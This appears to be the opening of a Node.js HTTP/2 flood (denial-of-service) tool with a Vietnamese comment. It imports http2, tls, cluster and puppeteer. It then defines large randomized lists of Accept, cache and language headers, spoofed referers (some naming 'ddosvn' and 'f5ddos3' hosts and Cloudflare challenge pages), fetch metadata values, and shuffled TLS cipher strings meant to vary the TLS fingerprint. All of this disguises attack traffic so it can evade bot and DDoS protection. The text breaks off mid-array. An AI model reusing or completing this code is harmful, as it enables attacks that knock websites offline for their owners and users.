const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const puppeteer = require("puppeteer");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

// Các danh sách header, country,... (giữ nguyên từ bạn)
const accept_header = [  
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
];
const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
    ];
const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
    ];
const refers = [
    "https://www.google.com/",
    "https://challenges.cloudflare.com/cdn-cqi",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://challenges.cloudflare.com/cdn-cqi@src",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://proxyscrape.com/",
    "https://www.instagram.com/",
    "https://wwww.reddit.com/",
    "https://fivem.net/",
    "https://www.fbi.gov/",
    "https://nettruyenplus.com/",
    "https://vnexpress.net/",
    "https://zalo.me",
    "https://shopee.vn",
    "https://www.tiktok.com/",
    "https://google.com.vn/",
    "https://tuoitre.vn/",
    "https://thanhnien.vn/",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords=",
    "http://host-tracker.com/check_page/?furl=",
    "http://itch.io/search?q=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://jobs.bloomberg.com/search?q=",
    "http://jobs.leidos.com/search?q=",
    "http://jobs.rbs.com/jobs/search?q=",
    "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
    "http://louis-ddosvn.rhcloud.com/f5.html?v=",
    "http://millercenter.org/search?q=",
    "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
    "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
    "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
    "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
    "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
    "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
    "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
    "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
    "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
    "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
    "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
    "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
    "http://search.aol.com/aol/search?q=",
    "http://taginfo.openstreetmap.org/search?q=",
    "http://techtv.mit.edu/search?q=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://vk.com/profile.php?redirect=",
    "http://www.ask.com/web?q=",
    "http://www.baoxaydung.com.vn/news/vn/search&q=",
    "http://www.bestbuytheater.com/events/search?q=",
    "http://www.bing.com/search?q=",
    "http://www.evidence.nhs.uk/search?q=",
    "http://www.google.com/?q=",
    "http://www.google.com/translate?u=",
    "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
    "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.pagescoring.com/website-speed-test/?url=",
    "http://www.reddit.com/search?q=",
    "http://www.search.com/search?q=",
    "http://www.shodanhq.com/search?q=",
    "http://www.ted.com/search?q=",
    "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://www.ustream.tv/search?q=",
    "http://yandex.ru/yandsearch?text=",
    "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
    "http://ytmnd.com/search?q=",
    "https://add.my.yahoo.com/rss?url=",
    "https://careers.carolinashealthcare.org/search?q=",
    "https://check-host.net/",
    "https://developers.google.com/speed/pagespeed/insights/?url=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://duckduckgo.com/?q=",
    "https://google.com/",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://play.google.com/store/search?q=",
    "https://pornhub.com/",
    "https://r.search.yahoo.com/",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://steamcommunity.com/market/search?q=",
    "https://vk.com/profile.php?redirect=",
    "https://www.bing.com/search?q=",
    "https://www.cia.gov/index.html",
    "https://www.facebook.com/",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://www.fbi.com/",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.co.ao/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.com/search?q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
    "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
    "https://www.npmjs.com/search?q=",
    "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
    "https://www.pinterest.com/search/?q=",
    "https://www.qwant.com/search?q=",
    "https://www.ted.com/search?q=",
    "https://www.usatoday.com/search/results?q=",
    "https://www.yandex.com/yandsearch?text=",
    "https://www.youtube.com/",
    "https://yandex.ru/",
    "https://nettruyento.com/"
    ];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const cplist = [
      "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
      "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
      "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
      "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
     "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
     "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
     "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
     'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
     "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
     'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
     
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
